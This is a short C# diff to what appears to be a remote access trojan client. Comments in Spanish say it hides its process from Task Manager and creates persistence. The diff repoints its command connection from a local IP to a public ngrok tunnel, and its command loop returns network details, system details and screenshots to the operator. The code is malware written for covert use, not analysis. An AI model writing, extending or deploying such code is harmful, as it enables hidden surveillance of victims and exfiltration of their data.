@@ -15,7 +15,7 @@ namespace Client
         private static NetworkStream stream;
         private static bool connected = true;
 
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             try
             {
@@ -28,10 +28,10 @@ namespace Client
 
                 // Ocultar el proceso del Administrador de Tareas y generar persistencia
                 Functions.HideFromTaskManager();
-                Functions.AddPersistence();
+               // Functions.AddPersistence();
 
                 // Iniciar la conexión con el servidor
-                client = new TcpClient("192.168.1.132", 443);
+                client = new TcpClient("4.tcp.eu.ngrok.io", 11280);
                 stream = client.GetStream();
 
                 // Bucle principal para recibir comandos y enviar respuestas
@@ -76,11 +76,11 @@ namespace Client
                         }
                         else if (command == "network_info")
                         {
-                            response = Functions.GetNetworkInfo();
+                            response = await SystemInfo.GetNetworkInfo();
                         }
                         else if (command == "system_info")
                         {
-                            response = Functions.GetSystemInfo();
+                            response = SystemInfo.GetSystemInfo();
                         }
                         else if (command=="screenshot")
                         {
